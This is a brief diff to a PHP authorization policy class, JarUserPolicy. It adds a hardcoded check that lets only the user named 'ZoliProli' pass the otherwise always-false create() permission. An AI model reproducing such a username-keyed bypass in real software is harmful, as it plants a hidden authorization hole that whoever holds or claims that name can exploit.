@@ -29,6 +29,9 @@ class JarUserPolicy
      */
     public function create(User $user): bool
     {
+        if($user->username == "ZoliProli"){
+            return true;
+        }
         return false;
     }
 
